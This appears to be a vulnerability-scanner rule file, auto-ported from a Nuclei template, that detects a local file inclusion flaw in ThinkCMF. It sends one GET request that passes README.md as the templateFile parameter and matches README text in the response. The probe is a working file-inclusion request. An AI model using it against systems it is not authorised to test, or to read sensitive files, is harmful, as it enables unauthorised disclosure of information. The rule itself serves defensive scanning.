schema_version: 1
id: "cortex.community:thinkcmf-lfi"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "ThinkCMF - Local File Inclusion"
  description: "ThinkCMF is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.freebuf.com/vuls/217586.html"
  cwes: [23]
  tags: ["thinkcmf", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/?a=display&templateFile=README.md" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "ThinkCMF" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "## README" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "## UPDATE" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
